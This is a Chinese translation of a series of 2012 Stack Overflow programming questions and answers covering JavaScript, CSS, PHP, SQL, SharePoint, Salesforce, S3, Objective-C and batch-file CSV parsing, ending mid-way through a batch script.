到目前为止，我所拥有的（JavaScript）是获取宽度 + 高度（减去填充）/我拥有的图像数量，所以假设我有 13 个图像要放置在 100x100 中，例如，我最多可以放置 4 个，但是如何确定每个图像的高度（宽度为 100 像素）以使其按比例适合？

**更新**

好的，我有 20 多张图像要显示在 100x100 块中，而不会切断左侧或右侧的图像。那么，我如何通过代码确定我只能显示 4 张图像，每张 25px x 25px。如何确定 4 个图像的适当宽度*高度以最佳地适合 100*100 。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:01:21.970

简短的回答是 WidthOfYourDisplayArea \ NumberOfImagesYouWantToFitInThatArea。其中“\”表示[整数除法](https://stackoverflow.com/questions/4228356/integer-division-in-javascript)，但还有更多。

在它的基础上，这将是[一个平铺问题](http://en.wikipedia.org/wiki/Tessellation)，即用 20 个不同大小的缩略图填充一个 100x100 的矩形（请参见下文）。但是，由于您正在修复缩略图的尺寸，因此它最终成为一个更容易处理的问题。

由于图像具有[纵横比](http://en.wikipedia.org/wiki/Aspect_ratio)，因此您必须只使用一个维度并让另一个维度“自行解决”。

无论如何，您的缩略图仍然必须为 25x25，但必须调整其中的图像大小才能使内容看起来不失真。所以你可以做的是将你的imgs包装在div中。div 将是 25x25，但 imgs 尺寸会有所不同。

如果您尝试制作缩略图的原始图像是 1024x768（例如），那么它的纵横比是 Width / Height = 1024/768 = 1.33333 。您将试图通过固定其宽度来找出图像的高度。因此，您正在查看类似 25 *（高度/宽度）（注意反转）的结果，结果类似于 25 *（1/1.33333）= 18.75004。所以，这个缩略图看起来有点像一个穿过 25x25 正方形的“带”，在顶部和底部有大约 3 个像素的空间。

我希望这有帮助。

# .net - 在 Azure 上托管现有 WCF 服务

> ID：10685515
> 
> 赞同：0
> 
> 时间：2012-05-21T12:44:47.400
> 
> 标签：.net, wcf, azure

我有一个由 App.config、Iservice.cs、Service、cs 和 Service.svc 组成的非常简单的 wcf 应用程序。我只是将它发布到 IIS 并最终得到带有我的 DLL 的 bin 目录、一个 web.config（来自 app.config）和我的 .svc 文件，该文件是浏览到访问服务的文件。

我想将其移至 Azure，但不确定最简单的方法。我在 vs2010 中创建了一个新的 Windows Azure 项目，但我无法将现有项目添加为角色，而是被迫创建新的 Web 角色或 wcf 服务角色。

谁能告诉我我必须改变什么来托管我现有的项目？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T13:37:38.783

只需打开您的 WCF Web 项目，右键单击它并选择：

添加 Windows Azure 部署项目：

![添加 Windows Azure 部署项目](../Images/68322537a044c35a456da64e6b5f8c90.png)

这将为您创建云服务项目，并将您的 Web 应用程序添加为 Web 角色。它仅在使用 Web 应用程序项目而不是网站项目时才有效。

# css - CSS对齐：左右问题

> ID：10685518
> 
> 赞同：1
> 
> 时间：2012-05-21T12:44:52.623
> 
> 标签：css, html, alignment

我希望所有文本都正确对齐，尽管`Support`  |  `Profile`  |  `Logout`左对齐，而`Welcome`右对齐。为什么会这样？

```
<div id="header">
        <a href="#">Support</a>&nbsp;&nbsp;|&nbsp;&nbsp;
        <a href="#">Profile</a>&nbsp;&nbsp;|&nbsp;&nbsp;
        <a href="#">Logout</a>
        <p>Welcome, Today is <script type="text/javascript">timeinit();</script></p>
    </div> 

   #header {
        background: #00557F;
        border-bottom: 2px gray;
        padding: 1em;
        width: 100%;
        height: 50px;
    }

    div#header p {
        color: #B7DDF2;
        font: 10px Arial;
        margin: 0;
        text-align: right;
        width: 100%;
    }

    div#header a { 
        text-decoration: none;
        color: #B7DDF2;
        font: 10px Arial;
        text-align: right;
        margin: 0;
        width: 100%;
    } 
    div#header a:hover { 
        font: 10px Arial;
        color: #FFCF8B; 
        text-decoration: underline;
        text-align: right;
        margin: 0;
        width: 100%;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T12:48:57.833

```
#header {
    text-align:right;
} 
```

将上面添加到您的 div

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T12:58:24.530

首先，P 是块元素，而不是内联元素（与 a 不同），您可以[在此处](https://stackoverflow.com/a/3428830/1394380)找到更多信息。
您的 p 元素占据了可能的内容宽度的 100%（在这种情况下是 div 的所有宽度），并且它的文本在 css u 设置下向右突出。
A 的情况并非如此；您将文本与 a 对齐，而不是 a 本身。要更改这一点，您需要为 div 本身而不是为 a 设置 text-aling 属性

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T12:52:51.717

你应该浮动到你的元素

`div#header a { float: right; }`

# jquery - 在输入文本上触发 jQuery 的按键事件

> ID：10685520
> 
> 赞同：1
> 
> 时间：2012-05-21T12:44:59.520
> 
> 标签：jquery, triggers, keydown

关于[`.trigger()`方法](http://api.jquery.com/trigger/)、[`Event`对象](http://api.jquery.com/category/events/event-object/)、[`which`属性](http://api.jquery.com/event.which/)、[JS char 代码](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)和下面的代码，为什么`#example`输入没有得到 char`a`作为*自动写入的*值？我误解了`.trigger()`方法吗？

```
<input type="text" name="example" id="example" value="" />

<script>
$(function() {
    var e = jQuery.Event("keydown", { which: 65 });
    $("#example").focus().trigger(e);
});
</script> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T12:55:14.140

您所犯的错误是您期望 jQuery 的`trigger`方法执行的操作。如果您查看[代码](https://github.com/jquery/jquery/blob/master/src/event.js#L232-379)，您会发现它实际上是在执行 jQuery 注册的事件处理程序，**而不是**DOM Level 3 事件。因为它只执行 jQuery 处理程序，所以您不会导致`change`需要触发该事件以更新文本框的 value 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:01:56.033

根据[文档](http://api.jquery.com/trigger/)

> 当相应的事件发生时，任何附加了 .bind() 或其快捷方法的事件处理程序都会被触发。

```
$('#foo').bind('click', function() {
  alert($(this).text());
});
$('#foo').trigger('click'); 
```

在您的情况下，它将是：

```
$('#example').bind('keydown', function(e) {
  alert("Pressed: " + e.keycode());
});
$('#example').focus().trigger('click'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:08:04.283

可能过度简化了事情，但你不能简单地改变`.val()`输入字段的（值）来模拟`auto-written values`吗？

您可以像这样简单地设置值 -

```
$("#example").val('Some auto-written value'); 
```

你们可以做一些像这样更直观的事情 -

```
var autoText = ['f','o','o','b','a','r'];
var characterIndex = 0;
var autoType = setInterval(function(){
  $("#example").val( $("#example").val() + autoText[characterIndex] );
  characterIndex++;
  if (characterIndex >= autoText.length){
    clearInterval(autoType);
  }
},_keystroke_interval); 
```

这`_keystroke_interval`是自动键入字符之间的间隔（以毫秒为单位）。`autoType`间隔变量将遍历数组的所有索引，并且`autoText`对于每次迭代，它将一个字符附加到输入字段。

这会给你更多的自动打字感觉......

[这是一个**有效的 jsFiddle 示例**](http://jsfiddle.net/587At/3/)

# c# - 从 C# 中的 Sharepoint 2010 任务中读取决策

> ID：10685523
> 
> 赞同：3
> 
> 时间：2012-05-21T12:45:11.893
> 
> 标签：c#, sharepoint, object, model, client

我对“<strong>客户端对象模型 Sharepoint API”有疑问，我没有找到可以帮助我的答案或在线人员。

我尝试为一项任务做出所有决定，但没有“简单”的方法来获得这些。目前我尝试以编程方式读取模板（“<strong>.xoml”文件），因为决策在其中（但只有标准决策，我需要标准和**自定义**决策）。

我认为这不是正确的做法。是否有另一种方法来获得 Sharepoint 2010 任务的所有决策？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-11T16:04:40.657

您的问题太针对特定领域，但我想您需要获取一个列表。

```
ClientContext clientContext = new ClientContext(_URL);
            List list = clientContext.Web.Lists.GetByTitle("Tasks");
            CamlQuery camlQuery = new CamlQuery();
            camlQuery.ViewXml = "<View/>"; //filter
            ListItemCollection listItems = list.GetItems(camlQuery);
            clientContext.Load(list); clientContext.Load(listItems);
            clientContext.ExecuteQuery();
                    try
                    {
                    foreach (ListItem _item in listItems)
                    {
                       //your code 
                    } 
```

# jasper-reports - 如何从 iReport 2.0.2 查看直接的 Excel 报表

> ID：10685525
> 
> 赞同：0
> 
> 时间：2012-05-21T12:45:18.353
> 
> 标签：jasper-reports, ireport

我从*iReports 2.0.2*查看 excel 报告时遇到问题，因为当我单击预览按钮以 excel 时它不想出去。它只出现在文件夹中。当我在报表中打开excel文件时，我看到数据没有按照表格行列的顺序排列。

我想要的是当我单击预览按钮 excel 时，报告将继续直接从报告中查看，并且对齐遵循行和列。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:21:57.000

iReport 2 与 3.5 或更高版本不同，它无法在应用程序中显示预览。这尤其适用于 Excel 报表。您可以在选项对话框中为每种导出类型设置特定的外部应用程序。至于格式问题，您没有发布任何代码，所以我怀疑有人可以提供帮助。您可能在报告降级期间出错。

# sql-server - 查找与计划作业关联的查询

> ID：10685530
> 
> 赞同：0
> 
> 时间：2012-05-21T12:45:39.580
> 
> 标签：sql-server, sql-server-2005

我是 sql server 的新手，我们有 sql server 2005 并且有计划的作业正在运行。我想知道运行计划作业时调用的查询。我检查了*作业活动监视器->右键单击作业->属性->步骤*

我可以在那里看到名称和类型，但不知道正在调用哪个过程以及它的代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:02:51.827

或者，您可以在企业管理器中运行此查询：

```
use msdb
select j.name,step_id,step_name, command from sysjobsteps js inner join sysjobs j on js.job_id=j.job_id
-- where j.name LIKE '%blah%'
order by 1, 2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:53:08.197

只需单击步骤上的“编辑”按钮，您将被带到步骤配置屏幕。您可以在此屏幕上查看正在运行的操作。

这是一个屏幕截图：

![步骤编辑画面](../Images/31ce31799b6e1056431eb256978c2b86.png)

# php - 将对象从函数传递到另一个函数

> ID：10685534
> 
> 赞同：0
> 
> 时间：2012-05-21T12:45:56.700
> 
> 标签：php, function

这是我通过几个 php 函数传递对象的情况。我正在寻找最佳性能，所以我想知道序列化是一种好方法还是不需要序列化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:49:09.553

只是传递对象。你不需要序列化。

```
function foo() {
    return new Foo;
}

function bar($obj) {
    return $obj;
}

function baz($obj) {
    $obj->foo();
}

baz(bar(foo())); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:49:21.523

如果你通过几个“函数”传递一个对象，那么你不需要序列化——这将在 PHP 解析器的内存中，序列化只是一种浪费。

如果您需要将值从一个脚本页面传递到另一个脚本页面，则可以选择序列化，因为第一个脚本中的变量将超出第二个脚本的范围。

大多数时候你不需要这样做——你到底想做什么？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:48:43.033

序列化是你能做的最糟糕的事情之一。php 5 中的对象是通过引用传递的，这样在函数之间传递的数据量是最小的（只有一个整数指针）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T12:50:52.747

我相信像这样传递对象没有问题：

```
$obj=new myclass;
$result=mufunk($obj);

function myfunk($myfobj)
  {
    $myreturn=new anotherclass;
    return $myreturn;
  } 
```

# facebook - facebook tab userid 在页面之后为 0

> ID：10685546
> 
> 赞同：0
> 
> 时间：2012-05-21T12:46:47.183
> 
> 标签：facebook, facebook-like, facebook-apps, userid

我正在尝试在 facebook 选项卡中获取 facebook 用户 ID，但不知何故这总是返回 0。这是我使用的代码：

```
$config = array();
$config["appId"]    = "427761887242287";
$config["secret"]   = "xxxxxxxxxxxxxxxxxxxxxx";
$facebook           = new Facebook($config);
$fbData             = $facebook->getSignedRequest(); 
```

Facebook appId 和密码是有效的，我已经尝试过重置密码。我试图在 $fbdata 上做一个 print_r 但这只会返回：

```
Array 
```

（[算法] => HMAC-SHA256 [issued_at] => 1337603346 [page] => 数组（[id] => 158282080958121 [liked] => 1 [admin] =>）

```
[user] => Array
    (
        [country] => nl
        [locale] => en_US
        [age] => Array
            (
                [min] => 21
            )

    ) 
```

)

如您所见，就用户而言，这只会返回一些无用的数据。我也试过 $facebook->getUser() 但这确实返回 0。我的服务器上确实有一个有效的 SSL 证书，我使用了正确的 http 和 https URL，但我不知道为什么我得到一个 0我登录时的用户ID。有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:52:13.833

如果这是一个 facebook 页面选项卡应用程序，那么除非用户明确授权您的应用程序，否则不会返回用户 ID。从您发布的回复来看，情况似乎就是这样。您需要让用户授权您的应用程序，而不仅仅是让这个页面工作

[https://developers.facebook.com/docs/authentication/pagetab/](https://developers.facebook.com/docs/authentication/pagetab/)

# iphone - 如何突出显示字符串的 NSRange

> ID：10685549
> 
> 赞同：1
> 
> 时间：2012-05-21T12:46:56.640
> 
> 标签：iphone, ios, nsstring, nsrange

在 TextView 中点击时，我正在使用此代码获取字符串。我得到了介于两者之间的字符串，`.`但我需要在 iOS 的复制粘贴功能中突出显示点击的字符串，例如选择。

```
- (void)textViewDidBeginEditing:(UITextView *)textView
{
    [NSTimer scheduledTimerWithTimeInterval:0.001 target:maintextview   selector:@selector(resignFirstResponder) userInfo:nil repeats:NO];
}

- (void)textViewDidEndEditing:(UITextView *)textView
{
    NSRange selectedRange = [textView selectedRange];
    NSString *backString = [maintextview.text substringToIndex:selectedRange.location];
    NSRange backRange = [backString rangeOfString:@"." options:NSBackwardsSearch];
    NSString *forwardString  = [maintextview.text substringFromIndex:backRange.location];
    NSLog(@"%@",[[forwardString componentsSeparatedByString:@"."] objectAtIndex:1]);
 } 
```

当我点击它时，如何`forwardString`用一些颜色突出显示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T20:38:19.500

你不能只为forwardString生成一个NSRange（通过使用substringFromIndex而不是substringToIndex）并调用：

```
[textView setSelectedRange]; 
```

?

# php - PHP Echo $info 的降序排列

> ID：10685557
> 
> 赞同：-3
> 
> 时间：2012-05-21T12:47:35.140
> 
> 标签：php, mysql, database

好的，所以我的数据库中有我的表，名为“posts”

有6个字段

```
postid, title, message, date, time, day 
```

每当我打印出每一行时，它都会按升序打印？

**桌子**

**邮政编码**| **标题**| **信息**

00001 | ........ | ...........

00002 | ........ | ...........

00003 | ........ | ...........

当我打印出来时，就像

```
00001, ..., ...
00002, ..., ...
00003, ..., ... 
```

但我想要

```
0003, ..., ...
0002, ..., ...
0001, ..., ... 
```

有没有办法做到这一点？我在谷歌找不到它所以......无论如何，提前感谢:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:51:12.847

```
SELECT `postid`, `title`, `message`, `date`, `time`, `day`
FROM `table1`
ORDER BY `postid` DESC; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T12:59:36.550

尝试这个，

```
select reverse(substr(reverse(postid), 1, 4)) as postid, title, message, date, time, day from posts order by postid desc; 
```

假设您想要 4 位而不是 5 位的输出

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:50:21.483

将此附加到您的查询中：

```
ORDER BY `postid` DESC 
```

它将按降序而不是升序对结果进行排序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T12:51:25.697

你可以试试这个——

```
SELECT `postid`, `title`, `message`, `date`, `time`, `day`
FROM `tablename`
ORDER BY `postid` DESC; 
```

你也可以

```
SELECT CONCAT(`postid`, ',', `title`, ',',  `message`, ',', `date`, ',', `time`, ',', `day`)
FROM `tablename`
ORDER BY `postid` DESC; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-21T12:51:39.080

执行查询，如`SELECT postid, title, message, date, time, day FROM`表`ORDER BY`postid`DESC`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-21T12:53:29.643

只需使用 ORDER BY 功能。

SELECT * FROM `your_table`ORDER BY `postid`DESC

DESC 关键字只是颠倒顺序。

# php - s3 存储桶中文件夹的大小

> ID：10685559
> 
> 赞同：4
> 
> 时间：2012-05-21T12:47:45.400
> 
> 标签：php, amazon-s3

我正在研究亚马逊 s3 存储桶。我需要通过代码找到存储桶内文件夹的大小。我没有找到任何直接查找文件夹大小的方法。那么有没有其他方法可以实现这个功能呢？

**编辑：**我知道 s3 存储桶中没有任何称为文件夹的东西。但我需要找到看起来像文件夹文件夹结构的所有文件的大小。也就是说，如果结构是这样的，`https://s3.amazonaws.com/****/uploads/storeeoll48jipuvjbqufcap3p6on6er2bwsufv5ojzqnbe01xvw0fy58x65.png`那么我需要找到所有具有该结构的文件的大小，`https://s3.amazonaws.com/****/uploads/...`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T13:09:01.063

来自 AwsConsoleApp.java AWS 开发工具包示例：

```
List<Bucket> buckets = s3.listBuckets();
long totalSize  = 0;
int  totalItems = 0;
for (Bucket bucket : buckets)
{
    ObjectListing objects = s3.listObjects(bucket.getName());
    do {
        for (S3ObjectSummary objectSummary : objects.getObjectSummaries()) {
            totalSize += objectSummary.getSize();
            totalItems++;
        }
        objects = s3.listNextBatchOfObjects(objects);
    } while (objects.isTruncated());
    System.out.println("You have " + buckets.size() + " Amazon S3 bucket(s), " +
                    "containing " + totalItems + " objects with a total size of " + totalSize + " bytes.");
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-21T13:23:45.470

如果您想在 python 中使用 boto，这里有一个小脚本，您可以尝试：

```
import boto
conn=boto.connect_s3('api_key','api_secret')
bucket=conn.get_bucket('bucketname');
keys=bucket.list('path')
size=0
for key in keys:
        size+= key.size
print size 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:05:26.943

S3 中没有所谓的“文件夹”，它是一个平面文件系统。文件名（桶键）可能包含斜杠（/），各种桶浏览器可以使用它来解释文件夹文件结构。

要知道 S3 中“文件夹”的大小，您首先必须知道包含该“文件夹”路径的子字符串的所有单个文件的键。如果您的存储桶包含数百万个文件，这将是一项非常昂贵的操作。

一些 S3 浏览器会自动执行此操作。我将 Cloudberry 资源管理器用于 S3。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T13:05:58.650

S3 中并不真正存在文件夹。

软件将带有 Key 的对象`subfolder/myfile.txt`显示为在`subfolder`文件夹中。但它只是一个显示的东西，该文件夹并不存在。如果您想以编程方式找出该“文件夹”中有多少项目，请遍历以子文件夹开头的所有对象/获取它们的大小并将其相加。或者查看[S3Browser](http://s3browser.com/)，它会在右键单击时为您提供大小。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-11-18T23:47:46.733

以下是使用 boto3 的方法：

```
import boto3

bucketName = '<bucketname>'
client = boto3.client('s3')

def get_all_objects_in_prefix(prefix):
    lastkey = ''
    while True:
        response = client.list_objects(
            Bucket=bucketName,
            Prefix=prefix,
            Marker=lastkey,
            MaxKeys=1000
        )
        if not response.get('Contents'):
            break
        lastkey = [item['Key'] for item in response['Contents']][-1]
        for item in response['Contents']:
            yield item

def get_filesize_of_prefix(prefix):
    size = 0
    for item in get_all_objects_in_prefix(prefix):
        size += item['Size']

    return size 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-12-05T11:57:06.283

这是我对 boto3 的处理方式

从存储桶返回目录（键）大小（以 MB 为单位）的函数

```
s3_client   = client('s3')  
def get_s3_folder_size_mb(bucket,prefix):
    len = 0
    s3_result =  s3_client.list_objects_v2(Bucket=bucket, Prefix=prefix)
    for key in s3_result['Contents']:
        len+=key['Size'] 
        while s3_result['IsTruncated']:
            continuation_key = s3_result['NextContinuationToken']
            s3_result = s3_client.list_objects_v2(Bucket=bucket, Prefix=prefix, ContinuationToken=continuation_key)
            for key in s3_result['Contents']:
                len+=key['Size']
    return len/1024/1024 
```

# php - 使用 jquery php 自动发送电子邮件通知

> ID：10685585
> 
> 赞同：1
> 
> 时间：2012-05-21T12:49:35.500
> 
> 标签：php, jquery, ajax, email, notifications

我想在每次新上传、新评论、新帖子等时发送电子邮件通知。

现在我正在调用一个函数：

```
 notify($user_id, $submitter_id, $post_id); 
```

并`notify()`处理这些 id 和 call `mail()`，将邮件发送给“提交者”和之前评论过的人。问题是，脚本花费的时间太长，并且由于我正在向该脚本发送 AJAX 请求以保存评论，因此用户最终等待`notify()`完成。这就像一个链接过程。

谁能建议我一个更好的方法来做到这一点？我不希望 Ajax 脚本等待：

*   保存评论
*   并同时发送电子邮件。

而且我不能使用 cron，因为我希望它是即时的，有点像 FB。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:01:25.387

在FB等等。它的创建就像我认为的那样：

当你需要更新时`notify`，你插入`outbounds`一些信息到表格中

```
insert into `outbounds` (`email`, `status`, `subject`, `message`, `created`, `sent`)
value ('some@address.net', STATUS::created, 'Some thing is happened', 'Message here', NOW(), NULL); 
```

以及始终运行的脚本，或者像 by 一样执行`cron`，或者，您可以使用设置 timeout=1 卷曲此脚本以发送消息

```
select * from `outbounds` where status = STATUS::created 
```

发送成功不要忘记

```
update `outbounds` set `status` = STATUS::sent, sent = NOW() where id = $message_id 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T13:15:50.403

如果您一次发送 100 封电子邮件，我建议您使用第三方服务，例如[Amazon SES](http://aws.amazon.com/ses/)或我个人最喜欢的[Postmark](http://postmarkapp.com)。您应该能够 ping 这些服务并继续执行其余功能，而无需等待回调。此外，它们的延迟很低，因此您的邮件几乎可以立即送达。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T12:56:36.800

使用队列存储要发送的电子邮件，并让脚本（例如`cron`作业）发送这些邮件。这样，用户只需要等待邮件插入队列，可能不会花费很长时间。

但是，在发送大量邮件时存在各种陷阱，并且`mail()`确实不是最好的解决方案。

# jquery - jqGrid getRootNodes 方法返回空数组

> ID：10685586
> 
> 赞同：0
> 
> 时间：2012-05-21T12:49:36.763
> 
> 标签：jquery, jqgrid

jqGrid getRootNodes 方法返回空数组，我使用以下代码获取根节点

```
var records = $trackerGrid.jqGrid("getRootNodes");
console.log(records); 
```

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:08:58.160

我想你`parent`以错误的方式填充了根节点的属性。它应该是`parent: "null"`或`parent: null`（见[答案](https://stackoverflow.com/a/7332627/315935)）。

[该演示](http://www.ok-soft-gmbh.com/jqGrid/LocalAdjacencyTree13.htm)创建具有树根节点的树网格。节点中的一个是叶子。演示表明`getRootNodes`可以正常工作。

# java - 更新子对象时 Salesforce 更新主记录

> ID：10685587
> 
> 赞同：1
> 
> 时间：2012-05-21T12:49:40.743
> 
> 标签：java, salesforce

我有一个程序可以提取 Salesforce`Case`对象，以及它们`CaseComment`和`Solution`对象。我还有一组过滤器，可以减少结果（关键字、fromDate、toDate 等）。我遇到的问题是 Salesforce 功能在我为该案例编辑或创建新评论时既不更新案例`LastModifiedDate`也不更新字段。`SystemModstamp`

最直接的解决方案是分别提取案例、评论和解决方案，然后从评论和解决方案中提取 ParentId (CaseId)，使用案例或解决方案的最大 lastModifiedDate 手动修改这些案例 ID，然后合并所有案例。但是这个过程有点例行公事，所以我在寻找另一个解决方案，Salesforce 和客户端。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T20:50:03.700

如果您想避免使用触发器，您可以使用 Workflow 进行“触摸”。从['12 春季版](http://na7.salesforce.com/help/doc/en/salesforce_spring12_release_notes.pdf)salesforce.com 开始支持跨对象工作流。因此，您可以在案例评论上创建一个工作流规则，以更新父案例上的字段。您可以专门为这个感人的过程创建一个自定义字段或重用任何其他字段。

例如，要将案例描述字段用作触摸字段，您可以执行以下操作。

1.  在 Case Comment 对象上创建一个新的工作流规则，以便在创建或编辑记录时触发。
2.  将工作流规则的条件指定为创建日期不等于 null 时。
3.  为字段更新创建新的工作流操作。
4.  指定对象应该是案例和字段描述
5.  在公式中输入 Parent.Description 作为值。这会将案例描述设置为它自己的值。有效地不改变记录。

关于更改API`LastModifiedDate`或`SysetemModstamp`通过 API，我不确定这是否可以作为正在进行的界面的一部分进行。Salesforce 将允许您通过 API 更新这些审核字段，但您必须联系他们才能启用该功能。

salesforce 在线文档[更详细地涵盖了审计领域](http://www.salesforce.com/us/developer/docs/api/Content/system_fields.htm)。它说：

> 如果您将数据导入 Salesforce 并需要设置审计字段的值，请联系 salesforce.com。一旦 salesforce.com 为您的组织启用此功能，您就可以为以下对象设置审计字段值：Account、CampaignMember、Case、CaseComment、Contact、FeedComment、FeedItem、Idea、IdeaComment、Lead、Opportunity 和 Vote。唯一不能为其设置值的审计字段是 systemModstamp。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T16:43:43.303

我能想到的最简单的方法是在创建或编辑 CaseComment 时仅“触摸”（更新而不对数据进行任何修改）案例记录。这可以通过 CaseComment 上的触发器来完成：

```
trigger CaseCommentAIAU on CaseComment (after insert, after update) {
    Set<Id> caseIds = new Set<Id>();
    for ( CaseComment cc : Trigger.new ) {
        caseIds.add(cc.ParentId);
    }
    Case[] caseUpdates = [select id from Case where Id in :caseIds];
    update caseUpdates;
} 
```

# iphone - initWithCoder 用于加载 xib 示例

> ID：10685595
> 
> 赞同：1
> 
> 时间：2012-05-21T12:50:32.207
> 
> 标签：iphone, objective-c, interface-builder

我正在阅读有关从 XIB 文件初始化存档对象的信息，并发现

```
- (id)initWithCoder:(NSCoder *)aDecoder 
```

是一种方法。但我无法解决这个问题。有人可以告诉我一个简单的例子来说明如何做到这一点吗？

万分感谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T13:26:47.040

该类`NSCoder`用于`archive/unarchive`（编组/解组，序列化/反序列化）的`objects`.

这是一种在流（如文件、套接字）上写入对象并能够稍后或在不同位置检索它们的方法。

我建议您阅读[存档](http://developer.apple.com/library/mac/#documentation/cocoa/conceptual/Archiving/Archiving.html)

您还需要定义如下方法：

```
- (void)encodeWithCoder:(NSCoder *)enCoder 
{ 
    [super encodeWithCoder:enCoder];

    [enCoder encodeObject:instanceVariable forKey:INSTANCEVARIABLE_KEY];

    // Similarly for the other instance variables.
    ....
} 
```

并在 initWithCoder 方法中初始化如下：

```
- (id)initWithCoder:(NSCoder *)aDecoder 
{
    if(self = [super initWithCoder:aDecoder]) {
        self.instanceVariable = [aDecoder decodeObjectForKey:INSTANCEVARIABLE_KEY];

       // similarly for other instance variables
       ....
}
    return self;
} 
```

您可以以标准方式初始化对象，即

```
CustomObject *customObject = [[CustomObject alloc] init]; 
```

取自[此答案的示例](https://stackoverflow.com/a/3943938/1106035)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T13:43:10.450

您可以通过以下方式使用它：

.h 文件

```
@interface Score : NSObject {
    NSString *Username;
    NSString *TotalPoints;
    NSString *LifeRemains;
    NSString *ScoreDate;
}

@property (nonatomic, retain) NSString *Username;
@property (nonatomic, retain) NSString *TotalPoints;
@property (nonatomic, retain) NSString *LifeRemains;
@property (nonatomic, retain) NSString *ScoreDate; 
```

在 .m 文件中

```
@synthesize Username, TotalPoints, LifeRemains, ScoreDate;

- (void)encodeWithCoder:(NSCoder *)encoder
{
//Encode properties, other class variables, etc
[encoder encodeObject:self.Username forKey:kScoreUsername];
[encoder encodeObject:self.TotalPoints forKey:kScoreTotalPoints];
[encoder encodeObject:self.LifeRemains forKey:kScoreLifeRemains];
[encoder encodeObject:self.ScoreDate forKey:kScoreDate];
}

- (id)initWithCoder:(NSCoder *)decoder
{
self = [super init];
if( self != nil )
{
    //decode properties, other class vars
    self.Username = [decoder decodeObjectForKey:kScoreUsername];
    self.TotalPoints = [decoder decodeObjectForKey:kScoreTotalPoints];
    self.LifeRemains = [decoder decodeObjectForKey:kScoreLifeRemains];
    self.ScoreDate = [decoder decodeObjectForKey:kScoreDate];
}
return self;
} 
```

快乐的编码...

# c# - SharePoint 2010 计时器作业：未执行执行方法

> ID：10685597
> 
> 赞同：0
> 
> 时间：2012-05-21T12:50:36.210
> 
> 标签：c#, .net, visual-studio-2010, sharepoint, sharepoint-2010

我试图通过编辑->“立即开始”来执行我的自定义计时器作业，但似乎甚至没有调用该方法。它有唯一的指令`Trace.Assert(false);`和一个断点。杂志说它执行正确。我试图重新启动 SPTimerV4；它运行。作业（以及任何其他作业）的执行时间为 0:00。有人可以帮我解决这个问题吗？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T09:29:18.237

您可以通过使用 Visual Studio 附加到 owstimer.exe 进程来调试 timerjob，并在执行方法的开头设置断点。从那里应该相对容易找出问题所在。

# batch-file - 使用批处理循环遍历 CSV 文件 - 空间问题

> ID：10685599
> 
> 赞同：1
> 
> 时间：2012-05-21T12:50:43.363
> 
> 标签：batch-file, cmd

我有一个这样的csv文件

```
name,sex,age
venu,m,16
test,,22 
```

**[编辑]**
名称也可以有逗号

```
"venu,gopal",m,16 
```

我想处理性是否无关紧要并将其保存到另一个文件中。

我有这样的脚本

```
@Echo Off
For /F "usebackq tokens=1-3  delims=," %%a in (test.csv) Do (
   echo %%a, %%b, %%c >> test-new.csv
) 
```

但是对于第三条记录，我得到 %%b 作为 22 应该是空间。如何解决这个问题？

**[编辑2]**

我已经按照该链接进行了尝试。我不确定我做错了什么。我遇到了同样的问题。请检查一次。

```
@echo off
setlocal DisableDelayedExpansion

For /F "usebackq tokens=1-3 delims=" %%x in (C:\somefile.csv) Do (

    setlocal EnableDelayedExpansion
    set "var=%%x"   

    set "var=!var:"=""!"
    set "var=!var:^=^^!"
    set "var=!var:&=^&!"
    set "var=!var:|=^|!"
    set "var=!var:<=^<!"
    set "var=!var:>=^>!"
    set "var=!var:,=^,^,!"
    set var=!var:""="!
    set "var=!var:"=""Q!"
    set "var=!var:,,="S"S!"
    set "var=!var:^,^,=,!"
    set "var=!var:""="!"
    set "var=!var:"Q=!"

    For /F "tokens=1-3  delims=," %%a in ("!var:"S"S=","!") Do (
